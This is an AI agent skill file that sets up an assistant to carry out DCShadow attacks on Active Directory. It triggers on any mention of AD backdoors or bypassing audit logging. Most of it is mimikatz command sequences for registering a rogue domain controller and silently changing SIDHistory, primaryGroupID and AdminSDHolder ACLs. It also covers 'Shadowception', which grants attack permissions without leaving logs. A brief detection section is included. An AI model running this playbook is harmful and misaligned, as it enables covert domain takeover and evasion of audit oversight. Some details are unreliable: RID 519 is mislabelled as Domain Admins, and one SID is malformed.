---
name: dcshadow
description: Execute DCShadow attacks in Active Directory to push attribute changes without logging. Use this skill whenever the user mentions DCShadow, rogue domain controllers, AD attribute modification, primaryGroupID manipulation, SIDHistory backdoors, mimikatz lsadump, or any technique to modify AD objects silently. Also trigger for questions about AD backdoors, stealthy privilege escalation, or bypassing AD audit logging.
---

# DCShadow Attack Methodology

DCShadow registers a **rogue Domain Controller** in Active Directory and uses it to **push attribute changes** (SIDHistory, SPNs, primaryGroupID, etc.) on specified objects **without leaving modification logs**. This is a powerful stealth technique for persistence and privilege escalation.

## ⚠️ Authorization Warning

**Only use this technique on systems you own or have explicit written authorization to test.** Unauthorized use is illegal and unethical.

## Prerequisites

- **Domain Admin** privileges (or specific minimal permissions - see below)
- Access to the **root domain**
- **Two mimikatz instances** running simultaneously
- SYSTEM-level access for the RPC server instance

## Core Attack Flow

### Step 1: Start RPC Server Instance (mimikatz1)

This instance starts the RPC servers and queues the changes. **Must run with SYSTEM privileges** - use `!processtoken`, NOT `elevate::token` (which only elevates the thread, not the process).

```bash
# Start mimikatz with SYSTEM privileges
mimikatz # !+
mimikatz # !processtoken

# Queue attribute changes (example: modify user description)
mimikatz # lsadump::dcshadow /object:username /attribute:Description /value="My new description"

# For multiple changes, use /stack to queue them all
mimikatz # lsadump::dcshadow /object:target1 /attribute:attr1 /value:value1 /stack
mimikatz # lsadump::dcshadow /object:target2 /attribute:attr2 /value:value2 /stack
```

### Step 2: Push Changes (mimikatz2)

This instance pushes all queued changes to the domain. Needs DA or minimal DCShadow permissions.

```bash
# Push all queued changes
mimikatz # lsadump::dcshadow /push
```

## Common Attack Scenarios

### 1. Add User to Enterprise Admins via SIDHistory

```bash
# mimikatz1 (RPC server)
lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519

# mimikatz2 (push)
lsadump::dcshadow /push
```

### 2. Change PrimaryGroupID to Domain Admins (RID 519)

```bash
# mimikatz1
lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:519

# mimikatz2
lsadump::dcshadow /push
```

**Important notes about primaryGroupID:**
- Changing PGID **always strips** membership from the previous primary group
- Default tools (ADUC, Remove-ADGroupMember) prevent removing users from their current primary group
- Membership reporting is inconsistent:
  - **Includes** PGID-derived members: `Get-ADGroupMember`, `net group`, ADUC
  - **Omits** PGID-derived members: `Get-ADGroup -Properties member`, ADSI Edit, `Get-ADUser -Properties memberOf`
- Recursive checks can miss nested primary group members

### 3. Modify AdminSDHolder ACL

```bash
# First, get current ACL
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=tld")).psbase.ObjectSecurity.sddl

# Modify the SDDL to add your user, then:
# mimikatz1
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=tld /attribute:ntSecurityDescriptor /value:<modified SDDL>

# mimikatz2
lsadump::dcshadow /push
```

### 4. Shadowception - Grant DCShadow Permissions via DCShadow

Grant DCShadow permissions to a user **without logging the permission change** by modifying ACLs through DCShadow itself.

**Required ACEs to add:**

| Object | ACE |
|--------|-----|
| Domain object | `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)` |
| Domain object | `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)` |
| Domain object | `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)` |
| Attacker computer object | `(A;;WP;;;UserSID)` |
| Target user object | `(A;;WP;;;UserSID)` |
| Sites object (Configuration) | `(A;CI;CCDC;;;UserSID)` |

**Execution with /stack:**

```bash
# mimikatz1 - queue all changes with /stack
lsadump::dcshadow /object:CN=Domain,DC=domain,DC=tld /attribute:ntSecurityDescriptor /value:<domain ACEs> /stack
lsadump::dcshadow /object:CN=computername,CN=Computers,DC=domain,DC=tld /attribute:ntSecurityDescriptor /value:<computer ACE> /stack
lsadump::dcshadow /object:CN=targetuser,CN=Users,DC=domain,DC=tld /attribute:ntSecurityDescriptor /value:<user ACE> /stack
lsadump::dcshadow /object:CN=SiteName,CN=Sites,CN=Configuration,DC=domain,DC=tld /attribute:ntSecurityDescriptor /value:<sites ACE> /stack

# mimikatz2 - single push applies all
lsadump::dcshadow /push
```

## Minimal Permissions Required

Instead of full Domain Admin, you can use these specific permissions:

### On Domain Object:
- `DS-Install-Replica` (Add/Remove Replica in Domain)
- `DS-Replication-Manage-Topology` (Manage Replication Topology)
- `DS-Replication-Synchronize` (Replication Synchronization)

### On Sites Object (Configuration container):
- `CreateChild` and `DeleteChild`

### On Registered DC Computer Object:
- `WriteProperty` (not just Write)

### On Target Object:
- `WriteProperty` (not just Write)

**Grant permissions with Nishang:**
```powershell
Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName targetuser -Username attacker -Verbose
```

⚠️ This leaves logs, unlike Shadowception.

## Detection and Monitoring

### Find Users with Non-Default Primary Group

```powershell
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
  Where-Object { $_.primaryGroupID -ne 513 } |
  Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

### Find Users with Hidden PrimaryGroupID (DACL Deny)

```powershell
Get-ADUser -Filter * -Properties primaryGroupID |
  Where-Object { -not $_.primaryGroupID } |
  Select-Object Name,SamAccountName
```

### Cross-Check Privileged Group Membership

Compare `Get-ADGroupMember` output with `Get-ADGroup -Properties member` to catch discrepancies from primaryGroupID manipulation.

## Common Targets and Attributes

| Attribute | Use Case | Example Value |
|-----------|----------|---------------|
| `SIDHistory` | Add to privileged groups | `S-1-5-21-...-519` |
| `primaryGroupID` | Direct group membership | `519` (Domain Admins) |
| `servicePrincipalName` | Golden SAML/kerberoasting | `HTTP/webserver.domain.local` |
| `Description` | C2 notes, markers | `"pwned"` |
| `ntSecurityDescriptor` | ACL manipulation | Full SDDL string |
| `userAccountControl` | Account properties | `512` (normal user) |

## LDAP Object Format

For precise targeting, use full LDAP paths:
```
/object:CN=Administrator,CN=Users,DC=domain,DC=tld
```

## Troubleshooting

### "Wrong data" errors
If you use incorrect attribute values or SDDL syntax, **ugly logs will appear**. Always validate:
- SDDL syntax before pushing
- Valid RIDs for primaryGroupID
- Proper SID format for SIDHistory

### Token elevation issues
- `elevate::token` only elevates the **thread**, not the process
- Use `!processtoken` for the RPC server instance
- The push instance needs DA or DCShadow permissions

### Multiple changes
Use `/stack` parameter to queue multiple changes, then single `/push` applies all.

## References

- [ired.team - DCShadow Write-up](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
- [TrustedSec - Primary Group Behavior](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [Nishang - Set-DCShadowPermissions](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)
